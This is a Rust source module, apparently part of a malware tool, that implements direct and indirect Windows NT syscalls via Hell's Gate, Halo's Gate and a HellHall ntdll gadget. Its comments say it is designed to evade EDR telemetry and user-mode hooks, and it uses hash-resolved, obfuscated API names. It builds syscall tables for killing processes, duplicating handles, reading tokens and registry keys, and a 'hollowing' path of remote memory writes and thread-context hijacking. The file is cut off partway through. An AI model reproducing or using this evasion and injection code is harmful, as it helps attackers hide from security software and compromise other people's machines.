//! Direct NT syscalls, x64 only (Hell's/Halo's Gate + HellHall gadget).
//!
//! ntdll stubs are located via hash-based export resolution (resolve.rs),
//! the syscall number (SSN) is lifted out of the stub, and the syscall is
//! issued through a `syscall; ret` gadget inside ntdll's own .text — the
//! instruction pointer and return address an EDR would correlate against
//! both point into ntdll, not into our module. If the gadget cannot be
//! resolved the stubs fall back to executing `syscall` from our own asm
//! (still bypassing user-mode inline hooks). If the target stub itself is
//! hooked (prologue is not `4C 8B D1 B8`), neighboring stubs are scanned
//! (32-byte stride, up to 32 each way) for a clean one and the SSN is
//! inferred by offset arithmetic.

use std::ffi::c_void;
use std::sync::atomic::{compiler_fence, Ordering};

use crate::resolve::resolve;

pub type NtStatus = i32;

pub const STATUS_END_OF_FILE: NtStatus = 0xC000_0011u32 as i32;
pub const STATUS_SHARING_VIOLATION: NtStatus = 0xC000_0043u32 as i32;
pub const STATUS_OBJECT_NAME_INVALID: NtStatus = 0xC000_0033u32 as i32;
pub const STATUS_NO_MEMORY: NtStatus = 0xC000_0017u32 as i32;

// DesiredAccess
pub const FILE_READ_DATA: u32 = 0x0001;
pub const FILE_READ_ATTRIBUTES: u32 = 0x0080;
pub const SYNCHRONOUS: u32 = 0x0010_0000;
// ShareAccess
pub const FILE_SHARE_READ: u32 = 0x0001;
pub const FILE_SHARE_WRITE: u32 = 0x0002;
pub const FILE_SHARE_DELETE: u32 = 0x0004;
// CreateDisposition
pub const FILE_OPEN: u32 = 1;
// CreateOptions
pub const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x0020;
pub const FILE_NON_DIRECTORY_FILE: u32 = 0x0040;
// OBJECT_ATTRIBUTES.Attributes
pub const OBJ_CASE_INSENSITIVE: u32 = 0x0040;
// FILE_INFORMATION_CLASS
pub const FILE_STANDARD_INFORMATION: u32 = 5;

#[repr(C)]
pub struct UnicodeString {
    pub length: u16,
    pub maximum_length: u16,
    pub buffer: *const u16,
}

impl UnicodeString {
    /// `units` must not include the NUL terminator.
    pub fn new(units: &[u16]) -> Self {
        let bytes = (units.len() * 2) as u16;
        UnicodeString {
            length: bytes,
            maximum_length: bytes + 2,
            buffer: units.as_ptr(),
        }
    }
}

#[repr(C)]
pub struct ObjectAttributes {
    pub length: u32,
    pub root_directory: usize,
    pub object_name: *const UnicodeString,
    pub attributes: u32,
    pub security_descriptor: *mut c_void,
    pub security_quality_of_service: *mut c_void,
}

impl ObjectAttributes {
    /// `object_name` may be null for calls that don't take a name
    /// (NtOpenProcess).
    pub fn new(object_name: *const UnicodeString) -> Self {
        ObjectAttributes {
            length: std::mem::size_of::<ObjectAttributes>() as u32,
            root_directory: 0,
            object_name,
            attributes: OBJ_CASE_INSENSITIVE,
            security_descriptor: std::ptr::null_mut(),
            security_quality_of_service: std::ptr::null_mut(),
        }
    }
}

/// CLIENT_ID for NtOpenProcess.
#[repr(C)]
pub struct ClientId {
    pub unique_process: usize,
    pub unique_thread: usize,
}

#[repr(C)]
#[derive(Default)]
pub struct IoStatusBlock {
    pub status: NtStatus,
    pub _pad: u32,
    pub information: usize,
}

#[repr(C)]
#[derive(Default)]
pub struct FileStandardInformation {
    pub allocation_size: i64,
    pub end_of_file: i64,
    pub number_of_links: u32,
    pub delete_pending: u8,
    pub directory: u8,
}

// ---------------------------------------------------------------------------
// SSN resolution (Hell's Gate + Halo's Gate fallback)
// ---------------------------------------------------------------------------

/// Clean x64 syscall stub prologue: `mov r10, rcx; mov eax, <ssn32>` with the
/// high SSN bytes zero (SSNs are < 0x1000 on every released Windows).
unsafe fn clean_stub_ssn(p: *const u8) -> Option<u32> {
    if *p == 0x4c
        && *p.add(1) == 0x8b
        && *p.add(2) == 0xd1
        && *p.add(3) == 0xb8
        && *p.add(6) == 0
        && *p.add(7) == 0
    {
        Some(u16::from_le_bytes([*p.add(4), *p.add(5)]) as u32)
    } else {
        None
    }
}

/// Extract the SSN for an ntdll export by name hash. Hell's Gate first;
/// if the stub is hooked, Halo's Gate over +-32 neighboring stubs (ntdll
/// syscall stubs are 32 bytes apart and sequential in SSN).
unsafe fn extract_ssn(name_hash: u32) -> Option<u32> {
    let stub = resolve(&crate::obf!("ntdll.dll"), name_hash);
    if stub == 0 {
        return None;
    }
    let p = stub as *const u8;
    if let Some(ssn) = clean_stub_ssn(p) {
        return Some(ssn);
    }
    for i in 1..=32isize {
        // Higher addresses hold higher SSNs.
        if let Some(ssn) = clean_stub_ssn(p.offset(i * 32)) {
            return ssn.checked_sub(i as u32);
        }
        if let Some(ssn) = clean_stub_ssn(p.offset(-i * 32)) {
            return Some(ssn + i as u32);
        }
    }
    None
}

// ---------------------------------------------------------------------------
// Indirect-syscall gadget (HellHall): the `syscall` instruction executes at
// an address inside ntdll's .text, so syscall-origin telemetry sees a
// legitimate ntdll instruction pointer/return address instead of our module.
// ---------------------------------------------------------------------------

extern "system" {
    fn GetModuleHandleW(name: *const u16) -> *mut c_void;
}

static mut SYSCALL_GADGET: usize = 0;
/// 0 = untried, 1 = ready, 2 = unavailable.
static mut GADGET_STATE: u8 = 0;
/// SSN staged for the trampoline immediately before each indirect call.
/// The collector runs on a single worker thread and nothing on the
/// handlereader worker threads touches this layer.
static mut ACTIVE_SSN: u32 = 0;

/// ntdll base and the .text section bounds (start, size in bytes), parsed
/// from the loaded module's PE headers.
unsafe fn ntdll_text() -> Option<(usize, usize, usize)> {
    let name = crate::resolve::wide(&crate::obf!("ntdll.dll"));
    let base = GetModuleHandleW(name.as_ptr());
    if base.is_null() {
        return None;
    }
    let b = base as *const u8;
    let pe_off = *(b.add(0x3c) as *const u32) as usize;
    let nt = b.add(pe_off);
    let num_sections = *(nt.add(4 + 2) as *const u16) as usize;
    let opt_size = *(nt.add(4 + 16) as *const u16) as usize;
    let sections = nt.add(4 + 20 + opt_size);
    for i in 0..num_sections.min(64) {
        let s = sections.add(i * 40);
        if &*s.cast::<[u8; 5]>() != b".text" {
            continue;
        }
        let va = *(s.add(0x0c) as *const u32) as usize;
        let vsz = *(s.add(0x08) as *const u32) as usize;
        return Some((base as usize, va, vsz));
    }
    None
}

/// Scan ntdll's .text for a `syscall; ret` (0F 05 C3) gadget. Any clean one
/// works — we only need the instruction bytes to live at a legitimate
/// ntdll address.
unsafe fn find_gadget() -> Option<usize> {
    let (base, va, vsz) = ntdll_text()?;
    let b = base as *const u8;
    let end = va + vsz.saturating_sub(2);
    let mut off = va;
    while off < end {
        let p = b.add(off);
        if *p == 0x0f && *p.add(1) == 0x05 && *p.add(2) == 0xc3 {
            return Some(base + off);
        }
        off += 1;
    }
    None
}

/// The resolved gadget address, or 0 when no gadget could be located
/// (callers fall back to the direct in-module stubs).
pub fn syscall_gadget() -> usize {
    unsafe {
        if GADGET_STATE == 0 {
            SYSCALL_GADGET = find_gadget().unwrap_or(0);
            GADGET_STATE = if SYSCALL_GADGET != 0 { 1 } else { 2 };
        }
        if GADGET_STATE == 1 {
            SYSCALL_GADGET
        } else {
            0
        }
    }
}

/// Indirect-syscall trampoline (naked): the caller's arguments already sit
/// in the exact Windows x64 syscall layout (rcx/rdx/r8/r9, stack args at
/// [rsp+0x28]), so the stub only swaps rcx into r10, loads the staged SSN
/// and tail-jumps to the ntdll `syscall; ret` gadget. The gadget's `ret`
/// returns straight to the trampoline's caller — rsp is never touched, so
/// the stack layout the kernel sees is identical to a real ntdll stub.
#[unsafe(naked)]
unsafe extern "C" fn gadget_trampoline(
    _a1: usize,
    _a2: usize,
    _a3: usize,
    _a4: usize,
    _a5: usize,
    _a6: usize,
    _a7: usize,
    _a8: usize,
    _a9: usize,
    _a10: usize,
    _a11: usize,
) -> i32 {
    core::arch::naked_asm!(
        "mov r10, rcx",
        "mov eax, dword ptr [rip + {ssn}]",
        "mov r11, qword ptr [rip + {gadget}]",
        "jmp r11",
        ssn = sym ACTIVE_SSN,
        gadget = sym SYSCALL_GADGET,
    );
}

/// Route a syscall through the ntdll gadget. Returns None when the gadget is
/// unavailable (caller then uses the direct in-module stub instead).
#[inline(never)]
unsafe fn gadget_call(ssn: u32, args: &[usize]) -> Option<i32> {
    if syscall_gadget() == 0 {
        return None;
    }
    ACTIVE_SSN = ssn;
    let a = |i: usize| args.get(i).copied().unwrap_or(0);
    Some(gadget_trampoline(
        a(0), a(1), a(2), a(3), a(4), a(5), a(6), a(7), a(8), a(9), a(10),
    ))
}

// ---------------------------------------------------------------------------
// SSN table (resolved once; C-style globals only per the loader constraints —
// the collector runs on a single worker thread and init writes are identical)
// ---------------------------------------------------------------------------

#[derive(Clone, Copy)]
pub struct Nt {
    create_file: u32,
    read_file: u32,
    query_information_file: u32,
    close: u32,
}

static mut NT: Nt = Nt {
    create_file: 0,
    read_file: 0,
    query_information_file: 0,
    close: 0,
};
/// 0 = untried, 1 = ready, 2 = resolution failed.
static mut NT_STATE: u8 = 0;

/// Resolved SSN table, or None if any needed syscall could not be resolved
/// (caller falls back to the Win32/std path).
pub fn nt() -> Option<Nt> {
    unsafe {
        if NT_STATE == 0 {
            NT = Nt {
                create_file: extract_ssn(crate::api!("NtCreateFile")).unwrap_or(0),
                read_file: extract_ssn(crate::api!("NtReadFile")).unwrap_or(0),
                query_information_file: extract_ssn(crate::api!("NtQueryInformationFile"))
                    .unwrap_or(0),
                close: extract_ssn(crate::api!("NtClose")).unwrap_or(0),
            };
            NT_STATE = if NT.create_file != 0
                && NT.read_file != 0
                && NT.query_information_file != 0
                && NT.close != 0
            {
                1
            } else {
                2
            };
        }
        if NT_STATE == 1 {
            Some(NT)
        } else {
            None
        }
    }
}

// ---------------------------------------------------------------------------
// Syscall stubs (Windows x64 syscall convention: rcx -> r10, args 5+ on the
// stack at [rsp+0x28..], result in rax; syscall clobbers rcx and r11).
// Every stub first tries the ntdll gadget (HellHall); the inline `syscall`
// below is the fallback when no gadget was found.
// ---------------------------------------------------------------------------

#[inline(never)]
unsafe fn syscall1(ssn: u32, a1: usize) -> i32 {
    if let Some(r) = gadget_call(ssn, &[a1]) {
        return r;
    }
    let ret: i32;
    std::arch::asm!(
        "mov r10, rcx",
        "mov eax, {s:e}",
        "syscall",
        "mov {r:e}, eax",
        s = in(reg) ssn,
        r = lateout(reg) ret,
        inlateout("rcx") a1 => _,
        out("r11") _,
        out("r10") _,
        options(nostack),
    );
    ret
}

#[inline(never)]
unsafe fn syscall2(ssn: u32, a1: usize, a2: usize) -> i32 {
    if let Some(r) = gadget_call(ssn, &[a1, a2]) {
        return r;
    }
    let ret: i32;
    std::arch::asm!(
        "mov r10, rcx",
        "mov eax, {s:e}",
        "syscall",
        "mov {r:e}, eax",
        s = in(reg) ssn,
        r = lateout(reg) ret,
        inlateout("rcx") a1 => _,
        inlateout("rdx") a2 => _,
        out("r11") _,
        out("r10") _,
        options(nostack),
    );
    ret
}

#[inline(never)]
unsafe fn syscall3(ssn: u32, a1: usize, a2: usize, a3: usize) -> i32 {
    if let Some(r) = gadget_call(ssn, &[a1, a2, a3]) {
        return r;
    }
    let ret: i32;
    std::arch::asm!(
        "mov r10, rcx",
        "mov eax, {s:e}",
        "syscall",
        "mov {r:e}, eax",
        s = in(reg) ssn,
        r = lateout(reg) ret,
        inlateout("rcx") a1 => _,
        inlateout("rdx") a2 => _,
        inlateout("r8") a3 => _,
        out("r11") _,
        out("r10") _,
        options(nostack),
    );
    ret
}

#[inline(never)]
unsafe fn syscall4(ssn: u32, a1: usize, a2: usize, a3: usize, a4: usize) -> i32 {
    if let Some(r) = gadget_call(ssn, &[a1, a2, a3, a4]) {
        return r;
    }
    let ret: i32;
    std::arch::asm!(
        "mov r10, rcx",
        "mov eax, {s:e}",
        "syscall",
        "mov {r:e}, eax",
        s = in(reg) ssn,
        r = lateout(reg) ret,
        inlateout("rcx") a1 => _,
        inlateout("rdx") a2 => _,
        inlateout("r8") a3 => _,
        inlateout("r9") a4 => _,
        out("r11") _,
        out("r10") _,
        options(nostack),
    );
    ret
}

#[inline(never)]
unsafe fn syscall5(ssn: u32, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize) -> i32 {
    if let Some(r) = gadget_call(ssn, &[a1, a2, a3, a4, a5]) {
        return r;
    }
    let ret: i32;
    std::arch::asm!(
        "sub rsp, 0x30",
        "mov qword ptr [rsp+0x28], {a5}",
        "mov r10, rcx",
        "mov eax, {s:e}",
        "syscall",
        "add rsp, 0x30",
        "mov {r:e}, eax",
        s = in(reg) ssn,
        r = lateout(reg) ret,
        a5 = in(reg) a5,
        inlateout("rcx") a1 => _,
        inlateout("rdx") a2 => _,
        inlateout("r8") a3 => _,
        inlateout("r9") a4 => _,
        out("r11") _,
        out("r10") _,
    );
    ret
}

#[inline(never)]
#[allow(clippy::too_many_arguments)]
unsafe fn syscall6(
    ssn: u32,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
) -> i32 {
    if let Some(r) = gadget_call(ssn, &[a1, a2, a3, a4, a5, a6]) {
        return r;
    }
    let ret: i32;
    std::arch::asm!(
        "sub rsp, 0x38",
        "mov qword ptr [rsp+0x28], {a5}",
        "mov qword ptr [rsp+0x30], {a6}",
        "mov r10, rcx",
        "mov eax, {s:e}",
        "syscall",
        "add rsp, 0x38",
        "mov {r:e}, eax",
        s = in(reg) ssn,
        r = lateout(reg) ret,
        a5 = in(reg) a5,
        a6 = in(reg) a6,
        inlateout("rcx") a1 => _,
        inlateout("rdx") a2 => _,
        inlateout("r8") a3 => _,
        inlateout("r9") a4 => _,
        out("r11") _,
        out("r10") _,
    );
    ret
}

#[inline(never)]
#[allow(clippy::too_many_arguments)]
unsafe fn syscall7(
    ssn: u32,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
    a7: usize,
) -> i32 {
    if let Some(r) = gadget_call(ssn, &[a1, a2, a3, a4, a5, a6, a7]) {
        return r;
    }
    let ret: i32;
    std::arch::asm!(
        "sub rsp, 0x40",
        "mov qword ptr [rsp+0x28], {a5}",
        "mov qword ptr [rsp+0x30], {a6}",
        "mov qword ptr [rsp+0x38], {a7}",
        "mov r10, rcx",
        "mov eax, {s:e}",
        "syscall",
        "add rsp, 0x40",
        "mov {r:e}, eax",
        s = in(reg) ssn,
        r = lateout(reg) ret,
        a5 = in(reg) a5,
        a6 = in(reg) a6,
        a7 = in(reg) a7,
        inlateout("rcx") a1 => _,
        inlateout("rdx") a2 => _,
        inlateout("r8") a3 => _,
        inlateout("r9") a4 => _,
        out("r11") _,
        out("r10") _,
    );
    ret
}

#[inline(never)]
#[allow(clippy::too_many_arguments)]
unsafe fn syscall9(
    ssn: u32,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
    a7: usize,
    a8: usize,
    a9: usize,
) -> i32 {
    if let Some(r) = gadget_call(ssn, &[a1, a2, a3, a4, a5, a6, a7, a8, a9]) {
        return r;
    }
    let ret: i32;
    std::arch::asm!(
        "sub rsp, 0x50",
        "mov qword ptr [rsp+0x28], {a5}",
        "mov qword ptr [rsp+0x30], {a6}",
        "mov qword ptr [rsp+0x38], {a7}",
        "mov qword ptr [rsp+0x40], {a8}",
        "mov qword ptr [rsp+0x48], {a9}",
        "mov r10, rcx",
        "mov eax, {s:e}",
        "syscall",
        "add rsp, 0x50",
        "mov {r:e}, eax",
        s = in(reg) ssn,
        r = lateout(reg) ret,
        a5 = in(reg) a5,
        a6 = in(reg) a6,
        a7 = in(reg) a7,
        a8 = in(reg) a8,
        a9 = in(reg) a9,
        inlateout("rcx") a1 => _,
        inlateout("rdx") a2 => _,
        inlateout("r8") a3 => _,
        inlateout("r9") a4 => _,
        out("r11") _,
        out("r10") _,
    );
    ret
}

#[inline(never)]
#[allow(clippy::too_many_arguments)]
unsafe fn syscall11(
    ssn: u32,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
    a7: usize,
    a8: usize,
    a9: usize,
    a10: usize,
    a11: usize,
) -> i32 {
    if let Some(r) = gadget_call(ssn, &[a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11]) {
        return r;
    }
    let ret: i32;
    std::arch::asm!(
        "sub rsp, 0x60",
        "mov qword ptr [rsp+0x28], {a5}",
        "mov qword ptr [rsp+0x30], {a6}",
        "mov qword ptr [rsp+0x38], {a7}",
        "mov qword ptr [rsp+0x40], {a8}",
        "mov qword ptr [rsp+0x48], {a9}",
        "mov qword ptr [rsp+0x50], {a10}",
        "mov qword ptr [rsp+0x58], {a11}",
        "mov r10, rcx",
        "mov eax, {s:e}",
        "syscall",
        "add rsp, 0x60",
        "mov {r:e}, eax",
        s = in(reg) ssn,
        r = lateout(reg) ret,
        a5 = in(reg) a5,
        a6 = in(reg) a6,
        a7 = in(reg) a7,
        a8 = in(reg) a8,
        a9 = in(reg) a9,
        a10 = in(reg) a10,
        a11 = in(reg) a11,
        inlateout("rcx") a1 => _,
        inlateout("rdx") a2 => _,
        inlateout("r8") a3 => _,
        inlateout("r9") a4 => _,
        out("r11") _,
        out("r10") _,
    );
    ret
}

// ---------------------------------------------------------------------------
// Typed NT wrappers
// ---------------------------------------------------------------------------

impl Nt {
    #[allow(clippy::too_many_arguments)]
    pub unsafe fn create_file(
        &self,
        handle: *mut usize,
        desired_access: u32,
        object_attributes: *const ObjectAttributes,
        io_status: *mut IoStatusBlock,
        allocation_size: *const i64,
        file_attributes: u32,
        share_access: u32,
        create_disposition: u32,
        create_options: u32,
        ea_buffer: *mut c_void,
        ea_length: u32,
    ) -> NtStatus {
        compiler_fence(Ordering::SeqCst);
        let status = syscall11(
            self.create_file,
            handle as usize,
            desired_access as usize,
            object_attributes as usize,
            io_status as usize,
            allocation_size as usize,
            file_attributes as usize,
            share_access as usize,
            create_disposition as usize,
            create_options as usize,
            ea_buffer as usize,
            ea_length as usize,
        );
        compiler_fence(Ordering::SeqCst);
        status
    }

    #[allow(clippy::too_many_arguments)]
    pub unsafe fn read_file(
        &self,
        handle: usize,
        event: usize,
        apc_routine: usize,
        apc_context: usize,
        io_status: *mut IoStatusBlock,
        buffer: *mut c_void,
        length: u32,
        byte_offset: *const i64,
        key: *const u32,
    ) -> NtStatus {
        compiler_fence(Ordering::SeqCst);
        let status = syscall9(
            self.read_file,
            handle,
            event,
            apc_routine,
            apc_context,
            io_status as usize,
            buffer as usize,
            length as usize,
            byte_offset as usize,
            key as usize,
        );
        compiler_fence(Ordering::SeqCst);
        status
    }

    pub unsafe fn query_information_file(
        &self,
        handle: usize,
        io_status: *mut IoStatusBlock,
        info: *mut c_void,
        length: u32,
        class: u32,
    ) -> NtStatus {
        compiler_fence(Ordering::SeqCst);
        let status = syscall5(
            self.query_information_file,
            handle,
            io_status as usize,
            info as usize,
            length as usize,
            class as usize,
        );
        compiler_fence(Ordering::SeqCst);
        status
    }

    pub unsafe fn close(&self, handle: usize) -> NtStatus {
        syscall1(self.close, handle)
    }
}

// ---------------------------------------------------------------------------
// Process / token / registry syscalls (round 5 Win32 conversions)
// ---------------------------------------------------------------------------

/// SSN table for the process-kill, handle-duplication and registry paths.
/// All-or-nothing like `Nt`: any resolution failure disables the whole
/// table and every caller falls back to its hash-resolved Win32 path.
#[derive(Clone, Copy)]
pub struct NtOps {
    open_process: u32,
    terminate_process: u32,
    duplicate_object: u32,
    open_key: u32,
    query_value_key: u32,
    enumerate_key: u32,
    enumerate_value_key: u32,
    open_process_token: u32,
    query_information_token: u32,
    close: u32,
}

static mut NT_OPS: NtOps = NtOps {
    open_process: 0,
    terminate_process: 0,
    duplicate_object: 0,
    open_key: 0,
    query_value_key: 0,
    enumerate_key: 0,
    enumerate_value_key: 0,
    open_process_token: 0,
    query_information_token: 0,
    close: 0,
};
/// 0 = untried, 1 = ready, 2 = resolution failed.
static mut NT_OPS_STATE: u8 = 0;

/// Process/registry SSN table, resolved once.
pub fn nt_ops() -> Option<NtOps> {
    unsafe {
        if NT_OPS_STATE == 0 {
            NT_OPS = NtOps {
                open_process: extract_ssn(crate::api!("NtOpenProcess")).unwrap_or(0),
                terminate_process: extract_ssn(crate::api!("NtTerminateProcess")).unwrap_or(0),
                duplicate_object: extract_ssn(crate::api!("NtDuplicateObject")).unwrap_or(0),
                open_key: extract_ssn(crate::api!("NtOpenKey")).unwrap_or(0),
                query_value_key: extract_ssn(crate::api!("NtQueryValueKey")).unwrap_or(0),
                enumerate_key: extract_ssn(crate::api!("NtEnumerateKey")).unwrap_or(0),
                enumerate_value_key: extract_ssn(crate::api!("NtEnumerateValueKey")).unwrap_or(0),
                open_process_token: extract_ssn(crate::api!("NtOpenProcessToken")).unwrap_or(0),
                query_information_token: extract_ssn(crate::api!("NtQueryInformationToken"))
                    .unwrap_or(0),
                close: extract_ssn(crate::api!("NtClose")).unwrap_or(0),
            };
            let n = NT_OPS;
            NT_OPS_STATE = if n.open_process != 0
                && n.terminate_process != 0
                && n.duplicate_object != 0
                && n.open_key != 0
                && n.query_value_key != 0
                && n.enumerate_key != 0
                && n.enumerate_value_key != 0
                && n.open_process_token != 0
                && n.query_information_token != 0
                && n.close != 0
            {
                1
            } else {
                2
            };
        }
        if NT_OPS_STATE == 1 {
            Some(NT_OPS)
        } else {
            None
        }
    }
}

impl NtOps {
    pub unsafe fn open_process(
        &self,
        handle: *mut usize,
        desired_access: u32,
        object_attributes: *const ObjectAttributes,
        client_id: *const ClientId,
    ) -> NtStatus {
        compiler_fence(Ordering::SeqCst);
        let status = syscall4(
            self.open_process,
            handle as usize,
            desired_access as usize,
            object_attributes as usize,
            client_id as usize,
        );
        compiler_fence(Ordering::SeqCst);
        status
    }

    pub unsafe fn terminate_process(&self, process: usize, exit_status: u32) -> NtStatus {
        compiler_fence(Ordering::SeqCst);
        let status = syscall2(self.terminate_process, process, exit_status as usize);
        compiler_fence(Ordering::SeqCst);
        status
    }

    #[allow(clippy::too_many_arguments)]
    pub unsafe fn duplicate_object(
        &self,
        source_process: usize,
        source_handle: usize,
        target_process: usize,
        target_handle: *mut usize,
        desired_access: u32,
        attributes: u32,
        options: u32,
    ) -> NtStatus {
        compiler_fence(Ordering::SeqCst);
        let status = syscall7(
            self.duplicate_object,
            source_process,
            source_handle,
            target_process,
            target_handle as usize,
            desired_access as usize,
            attributes as usize,
            options as usize,
        );
        compiler_fence(Ordering::SeqCst);
        status
    }

    pub unsafe fn open_key(
        &self,
        handle: *mut usize,
        desired_access: u32,
        object_attributes: *const ObjectAttributes,
    ) -> NtStatus {
        compiler_fence(Ordering::SeqCst);
        let status = syscall3(
            self.open_key,
            handle as usize,
            desired_access as usize,
            object_attributes as usize,
        );
        compiler_fence(Ordering::SeqCst);
        status
    }

    pub unsafe fn query_value_key(
        &self,
        key: usize,
        value_name: *const UnicodeString,
        class: u32,
        info: *mut c_void,
        length: u32,
        result_length: *mut u32,
    ) -> NtStatus {
        compiler_fence(Ordering::SeqCst);
        let status = syscall6(
            self.query_value_key,
            key,
            value_name as usize,
            class as usize,
            info as usize,
            length as usize,
            result_length as usize,
        );
        compiler_fence(Ordering::SeqCst);
        status
    }

    pub unsafe fn enumerate_key(
        &self,
        key: usize,
        index: u32,
        class: u32,
        info: *mut c_void,
        length: u32,
        result_length: *mut u32,
    ) -> NtStatus {
        compiler_fence(Ordering::SeqCst);
        let status = syscall6(
            self.enumerate_key,
            key,
            index as usize,
            class as usize,
            info as usize,
            length as usize,
            result_length as usize,
        );
        compiler_fence(Ordering::SeqCst);
        status
    }

    pub unsafe fn enumerate_value_key(
        &self,
        key: usize,
        index: u32,
        class: u32,
        info: *mut c_void,
        length: u32,
        result_length: *mut u32,
    ) -> NtStatus {
        compiler_fence(Ordering::SeqCst);
        let status = syscall6(
            self.enumerate_value_key,
            key,
            index as usize,
            class as usize,
            info as usize,
            length as usize,
            result_length as usize,
        );
        compiler_fence(Ordering::SeqCst);
        status
    }

    pub unsafe fn open_process_token(
        &self,
        process: usize,
        desired_access: u32,
        handle: *mut usize,
    ) -> NtStatus {
        compiler_fence(Ordering::SeqCst);
        let status = syscall3(
            self.open_process_token,
            process,
            desired_access as usize,
            handle as usize,
        );
        compiler_fence(Ordering::SeqCst);
        status
    }

    pub unsafe fn query_information_token(
        &self,
        token: usize,
        class: u32,
        info: *mut c_void,
        length: u32,
        return_length: *mut u32,
    ) -> NtStatus {
        compiler_fence(Ordering::SeqCst);
        let status = syscall5(
            self.query_information_token,
            token,
            class as usize,
            info as usize,
            length as usize,
            return_length as usize,
        );
        compiler_fence(Ordering::SeqCst);
        status
    }

    pub unsafe fn close(&self, handle: usize) -> NtStatus {
        syscall1(self.close, handle)
    }
}

// ---------------------------------------------------------------------------
// ABE hollowing syscalls (remote process/thread ops)
// ---------------------------------------------------------------------------

pub const STATUS_WAIT_0: NtStatus = 0;
pub const STATUS_TIMEOUT: NtStatus = 0x0000_0102;

/// SSNs for the ABE hollowing path. Unlike `Nt`, fields are individually
/// optional: 0 means the SSN could not be resolved (hooked or missing stub)
/// and the caller must fall back to the Win32 path for that one call.
#[derive(Clone, Copy, Default)]
pub struct NtAbe {
    pub allocate_virtual_memory: u32,
    pub write_virtual_memory: u32,
    pub read_virtual_memory: u32,
    pub protect_virtual_memory: u32,
    pub get_context_thread: u32,
    pub set_context_thread: u32,
    pub resume_thread: u32,
    pub terminate_process: u32,
    pub wait_for_single_object: u32,
    pub query_information_process: u32,
    pub unmap_view_of_section: u32,
    pub create_thread_ex: u32,
    pub free_virtual_memory: u32,
}

static mut NT_ABE: NtAbe = NtAbe {
    allocate_virtual_memory: 0,
    write_virtual_memory: 0,
    read_virtual_memory: 0,
    protect_virtual_memory: 0,
    get_context_thread: 0,
    set_context_thread: 0,
    resume_thread: 0,
    terminate_process: 0,
    wait_for_single_object: 0,
    query_information_process: 0,
    unmap_view_of_section: 0,
    create_thread_ex: 0,
    free_virtual_memory: 0,
};
/// 0 = untried, 1 = resolved (individual fields may still be 0).
static mut NT_ABE_STATE: u8 = 0;

/// ABE syscall SSN table, resolved once. Always returned; check each field
/// for nonzero before use.
pub fn nt_abe() -> NtAbe {
    unsafe {
        if NT_ABE_STATE == 0 {
            NT_ABE = NtAbe {
                allocate_virtual_memory: extract_ssn(crate::api!("NtAllocateVirtualMemory"))
                    .unwrap_or(0),
                write_virtual_memory: extract_ssn(crate::api!("NtWriteVirtualMemory")).unwrap_or(0),
                read_virtual_memory: extract_ssn(crate::api!("NtReadVirtualMemory")).unwrap_or(0),
                protect_virtual_memory: extract_ssn(crate::api!("NtProtectVirtualMemory"))
                    .unwrap_or(0),
                get_context_thread: extract_ssn(crate::api!("NtGetContextThread")).unwrap_or(0),
                set_context_thread: extract_ssn(crate::api!("NtSetContextThread")).unwrap_or(0),
                resume_thread: extract_ssn(crate::api!("NtResumeThread")).unwrap_or(0),
                terminate_process: extract_ssn(crate::api!("NtTerminateProcess")).unwrap_or(0),
                wait_for_single_object: extract_ssn(crate::api!("NtWaitForSingleObject"))
                    .unwrap_or(0),
                query_information_process: extract_ssn(crate::api!("NtQueryInformationProcess"))
                    .unwrap_or(0),
                unmap_view_of_section: extract_ssn(crate::api!("NtUnmapViewOfSection"))
                    .unwrap_or(0),
                create_thread_ex: extract_ssn(crate::api!("NtCreateThreadEx")).unwrap_or(0),
                free_virtual_memory: extract_ssn(crate::api!("NtFreeVirtualMemory")).unwrap_or(0),
            };
            NT_ABE_STATE = 1;
        }
        NT_ABE
    }
}

impl NtAbe {
    /// NtAllocateVirtualMemory: base and region size are in/out pointers.
    /// `want_base` of 0 lets the kernel pick the address.
    pub unsafe fn allocate_virtual_memory(
        &self,
        process: usize,
        base: *mut usize,
        zero_bits: usize,
        region_size: *mut usize,
        alloc_type: u32,
        protect: u32,
    ) -> NtStatus {
        compiler_fence(Ordering::SeqCst);
        let status = syscall6(
            self.allocate_virtual_memory,
            process,
            base as usize,
            zero_bits,
            region_size as usize,
            alloc_type as usize,
            protect as usize,
        );
        compiler_fence(Ordering::SeqCst);
        status
    }

    pub unsafe fn write_virtual_memory(
        &self,
        process: usize,
        base: usize,
        buffer: *const c_void,
        length: usize,
        written: *mut usize,
    ) -> NtStatus {
        compiler_fence(Ordering::SeqCst);
        let status = syscall5(
            self.write_virtual_memory,
            process,
            base,
            buffer as usize,
            length,
            written as usize,
        );
        compiler_fence(Ordering::SeqCst);
        status
    }

    pub unsafe fn read_virtual_memory(
        &self,
        process: usize,
        base: usize,
        buffer: *mut c_void,
        length: usize,
        read: *mut usize,
    ) -> NtStatus {
        compiler_fence(Ordering::SeqCst);
        let status = syscall5(
            self.read_virtual_memory,
            process,
            base,
            buffer as usize,
            length,
            read as usize,
        );
        compiler_fence(Ordering::SeqCst);
        status
    }

    /// NtProtectVirtualMemory: base and region size are in/out pointers.
    pub unsafe fn protect_virtual_memory(
        &self,
        process: usize,
        base: *mut usize,
        region_size: *mut usize,
        new_protect: u32,
        old_protect: *mut u32,
    ) -> NtStatus {
        compiler_fence(Ordering::SeqCst);
        let status = syscall5(
            self.protect_virtual_memory,
            process,
            base as usize,
            region_size as usize,
            new_protect as usize,
            old_protect as usize,
        );
        compiler_fence(Ordering::SeqCst);
        status
    }

    pub unsafe fn get_context_thread(&self, thread: usize, context: *mut c_void) -> NtStatus {
        compiler_fence(Ordering::SeqCst);
        let status = syscall2(self.get_context_thread, thread, context as usize);
        compiler_fence(Ordering::SeqCst);
        status
    }

    pub unsafe fn set_context_thread(&self, thread: usize, context: *const c_void) -> NtStatus {
        compiler_fence(Ordering::SeqCst);
        let status = syscall2(self.set_context_thread, thread, context as usize);
        compiler_fence(Ordering::SeqCst);
        status
    }

    pub unsafe fn resume_thread(&self, thread: usize, previous_count: *mut u32) -> NtStatus {
        compiler_fence(Ordering::SeqCst);
        let status = syscall2(self.resume_thread, thread, previous_count as usize);
        compiler_fence(Ordering::SeqCst);
